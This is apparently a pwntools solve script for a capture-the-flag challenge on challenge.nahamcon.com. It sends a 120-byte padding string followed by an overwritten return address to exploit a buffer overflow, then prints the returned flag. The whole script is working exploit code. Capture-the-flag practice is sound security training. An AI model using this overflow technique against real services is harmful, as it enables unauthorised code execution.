from pwn import *

remote_addr = "challenge.nahamcon.com"
remote_port = 30551

r = remote(remote_addr, remote_port)

offset = "A" * 120
payload = offset + "\x15\x12\x40"

print(r.recvuntil('Can you overflow this?: '))
r.sendline(payload)
#r.interactive()
flag = r.recvall().decode()[:-1]
print(flag)

